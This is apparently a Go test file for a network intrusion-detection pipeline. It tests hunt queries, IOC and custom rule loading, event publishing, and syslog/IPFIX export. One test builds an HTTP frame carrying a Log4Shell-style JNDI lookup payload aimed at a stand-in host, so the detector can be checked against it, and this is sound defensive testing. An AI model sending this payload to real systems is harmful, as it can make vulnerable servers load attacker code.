package pipeline

import (
	"context"
	"encoding/binary"
	"net"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"netprobe-ir/internal/capture"
	"netprobe-ir/internal/config"
	"netprobe-ir/internal/flowexport"
	"netprobe-ir/internal/model"
	"netprobe-ir/internal/syslogexport"
)

func TestHuntAcrossRetainedEvidence(t *testing.T) {
	c := config.Default()
	c.DataDir = t.TempDir()
	c.Recorder.Enabled = false
	e := New(c)
	e.ProcessFrame(capture.Frame{Time: time.Now(), Interface: "hunt0", Direction: model.DirectionOutbound, Data: huntHTTPFrame("GET /?x=${jndi:ldap://bad.example/a} HTTP/1.1\r\nHost: target.example\r\nUser-Agent: curl\r\n\r\n")})

	r := e.Hunt("dst:1.1.1.1 app:http severity:critical rule:NP-IDS-1201", 100)
	if r.Counts["findings"] == 0 || len(r.Findings) == 0 {
		t.Fatalf("expected finding, got %#v", r.Counts)
	}
	if r.Findings[0].RuleID != "NP-IDS-1201" {
		t.Fatalf("rule=%s", r.Findings[0].RuleID)
	}
	if got := e.Hunt(`app:http "target.example"`, 100); got.Counts["flows"] == 0 {
		t.Fatalf("expected HTTP flow match, counts=%#v", got.Counts)
	}
}

func huntHTTPFrame(payload string) []byte {
	p := []byte(payload)
	n := 20 + 20 + len(p)
	b := make([]byte, 14+n)
	binary.BigEndian.PutUint16(b[12:14], 0x0800)
	o := 14
	b[o] = 0x45
	binary.BigEndian.PutUint16(b[o+2:o+4], uint16(n))
	b[o+8] = 64
	b[o+9] = 6
	copy(b[o+12:o+16], []byte{10, 0, 0, 5})
	copy(b[o+16:o+20], []byte{1, 1, 1, 1})
	q := o + 20
	binary.BigEndian.PutUint16(b[q:q+2], 50000)
	binary.BigEndian.PutUint16(b[q+2:q+4], 80)
	b[q+12] = 0x50
	b[q+13] = 0x18
	copy(b[q+20:], p)
	return b
}

func TestPipelineLoadsExternalIOCAndCustomRuleFiles(t *testing.T) {
	d := t.TempDir()
	iocPath := filepath.Join(d, "iocs.json")
	rulesPath := filepath.Join(d, "rules.json")
	if err := os.WriteFile(iocPath, []byte(`{"ips":["1.1.1.1"]}`), 0600); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(rulesPath, []byte(`[{
	  "id":"LOCAL-PIPE-1",
	  "title":"Pipeline custom HTTP host rule",
	  "severity":"high",
	  "confidence":98,
	  "verdict":"signature_match",
	  "category":"custom",
	  "field":"http.host",
	  "operator":"equals",
	  "value":"target.example"
	}]`), 0600); err != nil {
		t.Fatal(err)
	}

	c := config.Default()
	c.DataDir = filepath.Join(d, "data")
	c.Recorder.Enabled = false
	c.IDS.IOCFile = iocPath
	c.IDS.RulesFile = rulesPath
	e := New(c)
	if errs := e.IDS.LoadErrors(); len(errs) != 0 {
		t.Fatalf("unexpected IDS load errors: %#v", errs)
	}
	e.ProcessFrame(capture.Frame{Time: time.Now(), Interface: "hunt0", Direction: model.DirectionOutbound, Data: huntHTTPFrame("GET / HTTP/1.1\r\nHost: target.example\r\n\r\n")})

	seen := map[string]bool{}
	for _, f := range e.Findings(100) {
		seen[f.RuleID] = true
	}
	for _, want := range []string{"NP-IOC-IP", "LOCAL-PIPE-1"} {
		if !seen[want] {
			t.Fatalf("missing %s after pipeline config wiring, findings=%#v", want, e.Findings(100))
		}
	}
}

func TestPipelinePublishesStructuredExporterEventsWithoutRawPayload(t *testing.T) {
	c := config.Default()
	c.DataDir = t.TempDir()
	c.Recorder.Enabled = false
	e := New(c)
	sub := e.EventBus.Subscribe(64)
	defer e.EventBus.Unsubscribe(sub)
	e.ProcessReplayFrame(capture.Frame{Time: time.Now(), Interface: "exp0", Direction: model.DirectionOutbound, Data: huntHTTPFrame("GET /health HTTP/1.1\r\nHost: exporter.example\r\nUser-Agent: test\r\n\r\n")})
	seen := map[string]bool{}
	deadline := time.After(500 * time.Millisecond)
	for len(seen) < 4 {
		select {
		case ev := <-sub.C:
			seen[ev.Category] = true
			if ev.Category == "network" {
				ps, ok := ev.Payload.(model.PacketSummary)
				if !ok {
					t.Fatalf("network payload type %T", ev.Payload)
				}
				if ps.Source.IP == "" || ps.Destination.IP == "" || ps.Length == 0 {
					t.Fatalf("incomplete packet metadata %+v", ps)
				}
			}
		case <-deadline:
			goto done
		}
	}
done:
	for _, cat := range []string{"network", "flow", "dpi", "http"} {
		if !seen[cat] {
			t.Fatalf("missing exporter event category %s: %#v", cat, seen)
		}
	}
}

func TestRemoteExportEndToEndFromReplayPipeline(t *testing.T) {
	sys, err := net.ListenPacket("udp", "127.0.0.1:0")
	if err != nil {
		t.Fatal(err)
	}
	defer sys.Close()
	fl, err := net.ListenPacket("udp", "127.0.0.1:0")
	if err != nil {
		t.Fatal(err)
	}
	defer fl.Close()
	c := config.Default()
	c.DataDir = t.TempDir()
	c.Recorder.Enabled = false
	e := New(c)
	_, err = e.SyslogExport.Upsert(syslogexport.Destination{Name: "e2e-syslog", Enabled: true, Host: "127.0.0.1", Port: sys.LocalAddr().(*net.UDPAddr).Port, Transport: "udp", Format: "rfc5424", Facility: 16, Severity: 6, Categories: []string{"http", "network"}, QueueSize: 64})
	if err != nil {
		t.Fatal(err)
	}
	_, err = e.FlowExport.Upsert(flowexport.Collector{Name: "e2e-ipfix", Enabled: true, Host: "127.0.0.1", Port: fl.LocalAddr().(*net.UDPAddr).Port, Protocol: "ipfix", ObservationDomain: 77, ActiveTimeoutSeconds: 1, InactiveTimeoutSeconds: 1, TemplateRefreshSeconds: 30, SamplingRate: 1, QueueSize: 64, AgentAddress: "127.0.0.1"})
	if err != nil {
		t.Fatal(err)
	}
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()
	e.SyslogExport.Start(ctx)
	e.FlowExport.Start(ctx)
	defer e.SyslogExport.Stop()
	defer e.FlowExport.Stop()
	e.ProcessReplayFrame(capture.Frame{Time: time.Now(), Interface: "replay0", Direction: model.DirectionOutbound, Data: huntHTTPFrame("GET /export HTTP/1.1\r\nHost: exporter.example\r\nUser-Agent: e2e\r\n\r\n")})
	_ = sys.SetReadDeadline(time.Now().Add(2 * time.Second))
	seenHTTP := false
	for i := 0; i < 6; i++ {
		b := make([]byte, 16384)
		n, _, er := sys.ReadFrom(b)
		if er != nil {
			break
		}
		if strings.Contains(string(b[:n]), "exporter.example") {
			seenHTTP = true
			break
		}
	}
	if !seenHTTP {
		t.Fatal("pipeline HTTP metadata did not reach Remote Syslog")
	}
	_ = fl.SetReadDeadline(time.Now().Add(3 * time.Second))
	seenTemplate, seenData := false, false
	for i := 0; i < 4; i++ {
		b := make([]byte, 65535)
		n, _, er := fl.ReadFrom(b)
		if er != nil {
			break
		}
		if n < 20 || binary.BigEndian.Uint16(b[:2]) != 10 {
			continue
		}
		setID := binary.BigEndian.Uint16(b[16:18])
		if setID == 2 {
			seenTemplate = true
		}
		if setID >= 256 {
			seenData = true
		}
	}
	if !seenTemplate || !seenData {
		t.Fatalf("IPFIX template/data missing template=%v data=%v", seenTemplate, seenData)
	}
}
